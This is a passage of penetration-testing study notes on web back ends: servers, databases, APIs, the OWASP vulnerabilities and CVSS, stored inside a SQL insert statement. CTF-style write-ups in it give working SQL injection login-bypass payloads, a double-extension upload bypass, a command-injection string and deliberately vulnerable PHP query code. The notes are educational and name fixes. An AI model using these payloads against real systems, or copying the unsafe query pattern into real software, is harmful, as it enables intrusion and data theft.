## 11.2 Hardware

The back-end server also contains all the necessary **hardware**, whose power and performance determine how stable and responsive the application is. As noted in the architecture section, large applications often **distribute load across many back-end servers** that work together to deliver the app. Web applications don''t have to run on a single physical server — they frequently use **data centers and cloud hosting** that provide virtual hosts, which is how big applications scale and stay available.

---

### Documentation Example (CTF-style write-up)

> **Recon note:** Fingerprinting the back-end stack.
>
> ```bash
> $ curl -I http://TARGET/
> Server: Apache/2.4.41 (Ubuntu)
> X-Powered-By: PHP/7.4.3
> # -> Linux + Apache + PHP -> likely LAMP; probe for MySQL next.
> ```
>
> **Evidence / Notes:** `Server` and `X-Powered-By` headers indicate a LAMP-style stack (Linux/Apache/PHP). This guides exploit selection (PHP file-upload/LFI, MySQL injection) and version-based CVE lookups.
>
> **Screenshot placeholder:** `[ Attach curl -I stack headers ]`

---

# 12. Web Servers

---

## 12.1 Workflow & HTTP Status Codes

A **web server** is the application running on the back-end server that handles all HTTP traffic from the browser, routes it to the requested pages, and responds. Web servers usually listen on **TCP ports 80 (HTTP) or 443 (HTTPS)**. The workflow is simple: the server accepts an HTTP request, routes it, runs any needed processing, and returns an HTTP response with a **status code** that signals the outcome. Knowing the common status codes is essential for reading responses during testing.

| Code | Description |
|------|-------------|
| `200 OK` | The request has succeeded. |
| `301 Moved Permanently` | The resource''s URL changed permanently. |
| `302 Found` | The resource''s URL changed temporarily. |
| `400 Bad Request` | Invalid syntax; server couldn''t understand the request. |
| `401 Unauthorized` | Unauthenticated attempt to access a page. |
| `403 Forbidden` | Client lacks access rights to the content. |
| `404 Not Found` | The server can''t find the requested resource. |
| `405 Method Not Allowed` | The method is known but disabled. |
| `408 Request Timeout` | Sent on an idle connection. |
| `500 Internal Server Error` | The server hit a situation it can''t handle. |
| `502 Bad Gateway` | A gateway server got an invalid upstream response. |
| `504 Gateway Timeout` | A gateway couldn''t get a response in time. |

Web servers accept text, JSON, and binary input (e.g. file uploads). You can inspect responses with **cURL**:

```bash
# View only headers with -I
$ curl -I https://academy.hackthebox.com
HTTP/2 200
date: Tue, 15 Dec 2020 19:54:29 GMT
content-type: text/html; charset=UTF-8
...SNIP...

# View the page source (no -I)
$ curl https://academy.hackthebox.com
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<title>Cyber Security Training : HTB Academy</title>
...
```

You can even build a basic web server in Python, JavaScript, or PHP, but each language has an optimized, free server for handling heavy traffic.

---

## 12.2 Apache, NGINX, IIS

Three web servers dominate the internet, and identifying which one a target runs guides your attack. **Apache** (~40% of sites) is the most common, often pre-installed on Linux, usually paired with PHP (via `mod_php`) but supporting .NET, Python, Perl, and Bash via CGI; open-source, well-documented, popular with startups and smaller companies (users include Apple, Adobe, Baidu). **NGINX** (~30%) focuses on serving many concurrent requests with low memory/CPU via an async architecture, making it the top choice for high-traffic sites (~60% of the top 100k) like Google, Facebook, Twitter, Cisco, Intel, Netflix, HackTheBox. **IIS** (~15%) is Microsoft''s server, running mainly on Windows Server, hosting .NET apps (also PHP, FTP), with strong Active Directory integration (Windows Auth) — used by Microsoft, Office365, Skype, Stack Overflow, Dell.

| Web server | Share | Notes |
|------------|-------|-------|
| **Apache** | ~40% | Open-source, Linux-default, PHP via `mod_php`, CGI for many langs. |
| **NGINX** | ~30% | Async, low-resource, high-traffic king (~60% of top 100k). |
| **IIS** | ~15% | Microsoft/Windows, .NET, strong AD/Windows Auth integration. |

Beyond these, **Apache Tomcat** (Java) and **Node.js** (back-end JavaScript) are also common.

---

### Documentation Example (CTF-style write-up)

> **Recon note:** Web server identification + status-code mapping.
>
> ```bash
> $ curl -I http://TARGET/
> Server: nginx/1.18.0
> # 200 = valid page, 403 = exists but restricted, 404 = absent, 401 = auth required
> ```
>
> **Evidence / Notes:** `Server: nginx/1.18.0` identifies the web server and version for CVE lookups. Status codes observed during content discovery mapped as above to separate real pages from noise. 
>
> **Screenshot placeholder:** `[ Attach server header + status-code legend ]`

---

# 13. Databases

---

## 13.1 Relational (SQL)

Web applications use back-end **databases** to store assets (images, files), content (posts, updates), and user data (usernames, passwords) — enabling fast storage/retrieval and dynamic, per-user content. Developers pick databases for speed, size, scalability, and cost. **Relational (SQL)** databases store data in **tables, rows, and columns**, and tables can have unique **keys** that link them to create relationships. For example, a `users` table (`id`, `username`, `first_name`, `last_name`) can link its `id` to a `user_id` column in a `posts` table, so you can fetch each post''s author without duplicating user data. A table can have multiple keys linking to multiple tables (e.g. `posts` to `comments`). The set of relationships is called a **Schema**. Relational DBs are fast and reliable for large, well-structured datasets, letting you retrieve all data about an element with a single query.

**Common relational databases:**

| Type | Description |
|------|-------------|
| **MySQL** | Most common on the internet; open-source and free. |
| **MSSQL** | Microsoft''s relational DB; common with Windows Server + IIS. |
| **Oracle** | Very reliable for big businesses; frequently updated; can be costly. |
| **PostgreSQL** | Free, open-source, easily extensible without major redesign. |

Others: SQLite, MariaDB, Amazon Aurora, Azure SQL.

---

## 13.2 Non-Relational (NoSQL)

A **non-relational (NoSQL)** database uses **no tables, rows, columns, keys, relationships, or schemas**. Instead it stores data using various storage models depending on the data type. Because there''s no fixed structure, NoSQL databases are highly **scalable and flexible** — ideal for datasets that aren''t well-defined or structured. There are four common storage models: **Key-Value, Document-Based, Wide-Column, and Graph**. The **Key-Value** model stores data (often as JSON or XML) with a key for each pair and all its data as the value:

```json
{
  "100001": { "date": "01-01-2021", "content": "Welcome to this web application." },
  "100002": { "date": "02-01-2021", "content": "This is the first post on this web app." },
  "100003": { "date": "02-01-2021", "content": "Reminder: Tomorrow is the ..." }
}
```

This resembles a dictionary/map in Python or PHP (`{''key'':''value''}`). The **Document-Based** model stores complex JSON objects, each with metadata, otherwise similar to Key-Value.

**Common NoSQL databases:**

| Type | Description |
|------|-------------|
| **MongoDB** | Most common NoSQL; free, open-source, Document-Based, stores JSON. |
| **ElasticSearch** | Free, open-source; optimized for storing/analyzing huge datasets; very fast search. |
| **Apache Cassandra** | Free, open-source; very scalable; handles faulty values gracefully. |

Others: Redis, Neo4j, CouchDB, Amazon DynamoDB.

---

## 13.3 Use in Web Applications

Modern languages and frameworks make it easy to store and retrieve data once a database is installed and running. In a PHP app using MySQL, you connect, optionally create a database, then run queries right from PHP.

**Connect to the DB server:**

```php
$conn = new mysqli("localhost", "user", "pass");
```

**Create a database:**

```php
$sql = "CREATE DATABASE database1";
$conn->query($sql)
```

**Connect to a specific DB and query it:**

```php
$conn = new mysqli("localhost", "user", "pass", "database1");
$query = "select * from table_1";
$result = $conn->query($query);
```

**Using user input in a query (the dangerous part):**

```php
$searchInput =  $_POST[''findUser''];
$query = "select * from users where name like ''%$searchInput%''";
$result = $conn->query($query);
```

**Returning the result to the user:**

```php
while($row = $result->fetch_assoc() ){
    echo $row["name"]."<br>";
}
```

This shows how easy databases are to use — but notice the user input (`$searchInput`) is concatenated **directly** into the SQL query. If not securely coded, this leads straight to **SQL Injection** vulnerabilities.

---

### Documentation Example (CTF-style write-up)

> **Finding:** User input concatenated into a SQL query (SQLi vector).
>
> **Reproduction:**
> ```php
> // Vulnerable sink:
> $query = "select * from users where name like ''%$searchInput%''";
> // Payload in findUser: %'' OR ''1''=''1
> // -> query returns all users, confirming injection.
> ```
>
> **Evidence / Notes:** The `findUser` POST value is placed unescaped into the `LIKE` clause, allowing query manipulation (data exfiltration, auth bypass, potentially RCE depending on privileges). **Severity: Critical.** Fix: use parameterized queries / prepared statements, never string concatenation.
>
> **Screenshot placeholder:** `[ Attach vulnerable query + injection result ]`

---

# 14. Development Frameworks & APIs

---

## 14.1 Development Frameworks

Because modern web apps are complex, most are built with **web development frameworks** rather than from scratch. Frameworks make it fast to implement common functionality (like user registration) and wire it to the front end. Knowing which framework a target uses points you to framework-specific behaviors and CVEs. Note that big sites usually combine *several* frameworks and web servers rather than just one.

- **Laravel (PHP)** — common with startups/smaller companies; powerful yet easy.
- **Express (Node.js)** — PayPal, Yahoo, Uber, IBM, MySpace.
- **Django (Python)** — Google, YouTube, Instagram, Mozilla, Pinterest.
- **Rails (Ruby)** — GitHub, Hulu, Twitch, Airbnb, (formerly Twitter).

---

## 14.2 Query Parameters

The default way to send arguments to a web page is through **GET and POST request parameters**, which let the front end specify values the back end processes. A `/search.php` page might take an `item` parameter. In a **GET** request the parameter rides in the URL (`/search.php?item=apples`); in a **POST** request it''s in the request body:

```http
POST /search.php HTTP/1.1
...SNIP...

item=apples
```

Query parameters let a single page accept various inputs, each processed differently. For some scenarios, **Web APIs** are quicker and more efficient (covered next).

---

## 14.3 Web APIs — SOAP & REST

A **Web API (Application Programming Interface)** is an interface specifying how an application can interact with others — for web apps, it enables remote access to back-end functionality. Web APIs are usually accessed over HTTP and handled by web servers. For example, a weather app''s API returns a city''s weather as JSON; Twitter''s API returns tweets as XML/JSON and can even post a tweet (if authenticated). Developers build API functionality using standards like **SOAP** or **REST**.

**SOAP (Simple Object Access Protocol)** shares data through **XML** — the request is XML over HTTP and the response is XML, which front-end components parse. Example SOAP message:

```xml
<?xml version="1.0"?>
<soap:Envelope
xmlns:soap="http://www.example.com/soap/soap/"
soap:encodingStyle="http://www.w3.org/soap/soap-encoding">
  <soap:Header></soap:Header>
  <soap:Body>
    <soap:Fault></soap:Fault>
  </soap:Body>
</soap:Envelope>
```

SOAP is useful for transferring structured or binary data and stateful objects, but can be heavy/complicated even for small queries — which is where REST shines.

**REST (Representational State Transfer)** shares data through the **URL path** (e.g. `search/users/1`) and usually returns **JSON**. Unlike query parameters, REST endpoints expect one type of input passed directly in the path without naming it — great for search/sort/filter — and break functionality into smaller, modular, scalable APIs. Example JSON response to `GET /category/posts/`:

```json
{
  "100001": { "date": "01-01-2021", "content": "Welcome to this web application." },
  "100002": { "date": "02-01-2021", "content": "This is the first post on this web app." }
}
```

**REST uses HTTP methods for different actions:**

- `GET` — retrieve data
- `POST` — create data (non-idempotent)
- `PUT` — create or replace data (idempotent)
- `DELETE` — remove data

---

### Documentation Example (CTF-style write-up)

> **Recon note:** API enumeration from front-end JavaScript.
>
> ```bash
> # JS referenced /api/users/{id} -> test REST methods
> $ curl -s http://TARGET/api/users/1            # GET -> JSON user
> $ curl -s -X PUT http://TARGET/api/users/1 -d ''{...}''   # test write access
> ```
>
> **Evidence / Notes:** REST API at `/api/users/{id}` returns JSON; tested each HTTP method (GET/POST/PUT/DELETE) for broken access control / IDOR (e.g. changing the `{id}`). Framework fingerprinted as Express (Node.js) from headers.
>
> **Screenshot placeholder:** `[ Attach API JSON response + method tests ]`

---

# 15. Common Web Vulnerabilities

---

## 15.1 Broken Authentication / Access Control

When testing an internally-developed app, or when no public exploit exists, you''ll manually identify vulnerabilities — and these are among the most common and dangerous (all part of the OWASP Top 10). **Broken Authentication** lets attackers bypass authentication — logging in without valid credentials, or a normal user becoming an admin. **Broken Access Control** lets attackers reach pages/features they shouldn''t — e.g. a normal user accessing the admin panel. A concrete example: **College Management System 1.2** has an auth-bypass where entering `'' or 0=0 #` in the email field with any password logs you in.

```text
Email field:  '' or 0=0 #
Password:     (anything)
-> authenticated without valid credentials
```

---

## 15.2 Malicious File Upload

Another common way to take over an app is uploading **malicious scripts**. If a file-upload feature doesn''t properly validate uploads, you may upload a malicious script (e.g. a PHP file) and execute commands on the server. Many developers don''t check uploads properly, and even those who do often have **bypassable** checks. Example: the WordPress plugin **Responsive Thumbnail Slider 1.0** can be exploited to upload arbitrary files — including malicious scripts — via a **double extension** like `shell.php.jpg` (there''s even a Metasploit module for it).

```text
Upload:  shell.php.jpg   (double extension bypasses a weak "is it an image?" check)
-> server executes the PHP -> remote command execution
```

---

## 15.3 Command Injection

Many web apps run local **OS commands** to perform tasks (e.g. installing a plugin by running a download command with a user-supplied plugin name). If input isn''t filtered/sanitized, attackers can **inject another command** to run alongside the intended one, directly executing commands on the server — **command injection**. It''s widespread because developers often don''t sanitize input or use weak checks. Example: the WordPress plugin **Plainview Activity Monitor 20161228** lets attackers inject a command in the `ip` value by appending `| COMMAND...` after it.

```text
ip value:  127.0.0.1 | whoami
-> the injected `whoami` runs on the back-end server
```

---

## 15.4 SQL Injection

Another very common vulnerability, similar to command injection: **SQL injection** occurs when an app runs a SQL query that includes user-supplied input. Recall the vulnerable database example:

```php
$query = "select * from users where name like ''%$searchInput%''";
```

If `$searchInput` isn''t filtered/validated, you can execute **another SQL query** alongside this one, potentially taking control of the database and its host. Example: **College Management System 1.2** also has SQLi where you inject a query that always returns true (successful authentication) to log in — the same flaw can retrieve data or gain control of the host.

These vulnerabilities recur constantly in real assessments; even a basic understanding of each gives you an edge, and later modules cover each in depth.

---

### Documentation Example (CTF-style write-up)

> **Finding:** Authentication bypass via SQL injection in the login form.
>
> **Reproduction:**
> ```text
> Email/username:  '' or 0=0 #
> Password:        anything
> -> query always evaluates true -> logged in without valid credentials.
> ```
>
> **Evidence / Notes:** User input is concatenated into the auth SQL query; a tautology (`or 0=0`) plus a comment (`#`) bypasses the password check. Same flaw enables data extraction and potentially host control. **Severity: Critical.** Fix: prepared statements, input validation, least-privilege DB account.
>
> **Screenshot placeholder:** `[ Attach injected login + authenticated session ]`

---

# 16. Public Vulnerabilities

---

## 16.1 Public CVEs

The most critical back-end vulnerabilities are those exploitable **externally** to take over the server without local access — usually caused by coding mistakes in the app''s back-end components, ranging from easy to highly sophisticated. Because many organizations deploy the same open-source and proprietary apps, these apps get tested worldwide, so vulnerabilities are frequently found, patched, and published with a **CVE (Common Vulnerabilities and Exposures)** record and score. Pentesters often publish proof-of-concept exploits too, which makes **searching for public exploits the very first step** for any web app.

**Step 1 — Identify the web application version.** It''s often in the source code; for open-source apps, check the repo for where the version shows (e.g. a `version.php` page) and confirm it on the target.

**Step 2 — Search for public exploits** for that exact version — on Google and exploit databases like **Exploit-DB**, **Rapid7 DB**, or **Vulnerability Lab**. Prioritize exploits with a **CVE score of 8–10** or that lead to **RCE**.

**Step 3 — Also check external components.** If the app uses plugins or other third-party components, search for *their* vulnerabilities too.

---

## 16.2 CVSS

The **Common Vulnerability Scoring System (CVSS)** is the open-source industry standard for rating vulnerability severity, used by organizations and governments to produce consistent scores and prioritize responses. Scores come from a formula using three metric groups: **Base**, **Temporal**, and **Environmental**. Base metrics produce a **0–10** score, modified by Temporal and Environmental. The **National Vulnerability Database (NVD)** provides Base scores for nearly all publicly disclosed vulnerabilities (it omits Temporal, which changes over time, and Environmental, which is organization-specific). Current systems are **CVSS v2** and **v3**.

| CVSS v2.0 | Range | | CVSS v3.0 | Range |
|-----------|-------|---|-----------|-------|
| Low | 0.0–3.9 | | None | 0.0 |
| Medium | 4.0–6.9 | | Low | 0.1–3.9 |
| High | 7.0–10.0 | | Medium | 4.0–6.9 |
| | | | High | 7.0–8.9 |
| | | | Critical | 9.0–10.0 |

The NVD offers **CVSS v2 and v3 calculators** so organizations can add Temporal and Environmental data unique to them and fine-tune the score to their environment.

---

## 16.3 Back-End Server Vulnerabilities

Beyond the app itself, you should also look for vulnerabilities in **other back-end components** like the back-end server and the web server. The most critical back-end vulnerabilities are in **web servers**, since they''re publicly accessible over TCP. A well-known example is **Shellshock**, which affected Apache servers from 2014 and earlier and used HTTP requests to gain remote control of the back-end server. Vulnerabilities in the back-end server or database are usually exploited *after* gaining local access (via external flaws or during internal testing) and are used to escalate privileges or pivot to other servers in the network. Even if not directly exploitable externally, these are still critical and must be patched to protect the whole application.

---

### Documentation Example (CTF-style write-up)

> **Finding:** Outdated component with a public RCE exploit.
>
> **Reproduction:**
> ```text
> 1. Identify version (e.g. version.php / repo) -> "App vX.Y".
> 2. Search Exploit-DB / Rapid7 for "App vX.Y" -> CVE-XXXX-XXXX (CVSS 9.8, RCE).
> 3. Run the public PoC against the target -> command execution.
> ```
>
> **Evidence / Notes:** The deployed version matches a published CVE scoring 9.8 (Critical) with a working PoC leading to RCE. Also checked plugins/components for their own CVEs. **Severity: Critical.** Fix: patch/upgrade to the fixed version; monitor components for CVEs.
>
> **Screenshot placeholder:** `[ Attach version identification + exploit result ]`

---

# 17. Next Steps

---

This module covered the fundamentals of how a web application is built, how it works, and the dangers it can introduce into a corporate environment. The best way to deepen this understanding is a **hands-on approach** — ideally by building a small web application yourself, which teaches the structure and how the pieces connect far better than reading alone.

**Suggested build-it-yourself steps:**

| Step | To-do |
|------|-------|
| 1 | Set up a VM with a web server |
| 2 | Create an HTML page |
| 3 | Design it with CSS |
| 4 | Add simple functions with JavaScript |
| 5 | Program a simple web application |
| 6 | Connect your web application to the database |
| 7 | Experiment with APIs |
| 8 | Test your application for vulnerabilities |
| 9 | Adjust your code and configurations to close the vulnerabilities |

Building a small app gives a much deeper understanding of structure and functionality — how to set up and manage a web server, the database''s role, and how code pieces link together. Good next modules are **Web Requests** and **JavaScript Deobfuscation**, then **Hacking WordPress** and OWASP Top 10 modules like **SQL Injection Fundamentals**, before applying everything on **Easy boxes on HackTheBox**.

---

## Wrapping Up

You now have a map of the entire web-application landscape: the client-server model and the four infrastructure models; the split between front end (HTML, CSS, JavaScript) and back end (servers, web servers, databases, frameworks); the three-tier architecture; the front-end vulnerabilities that endanger users (sensitive data exposure, HTML injection, XSS, CSRF) and the sanitization/validation that stops them; the back-end stack and its servers, databases, and APIs (SOAP/REST); and the common and public vulnerabilities (broken auth/access control, file upload, command injection, SQLi) scored with CVSS. The unifying theme is that **every component is an attack surface**, and the unsafe handling of user input is the root of most web flaws. As you move into dedicated modules, keep testing from both unauthenticated and authenticated angles, map each finding to the OWASP Top 10, and always document reproduction steps, evidence, and a concrete fix — exactly as in the examples throughout these notes.', NULL, 'PUBLISHED', 'PUBLIC', 50, 'cmvfonfhr00ayida0a37aijsy', 'cmvcr40dj0000idhkp489xa3k', to_timestamp(1792520631.871), to_timestamp(1792520631.871), NULL, NULL)
ON CONFLICT ("slug") DO UPDATE SET "title" = EXCLUDED."title", "contentMarkdown" = EXCLUDED."contentMarkdown", "contentHtml" = EXCLUDED."contentHtml", "description" = EXCLUDED."description", "status" = EXCLUDED."status", "updatedAt" = EXCLUDED."updatedAt";
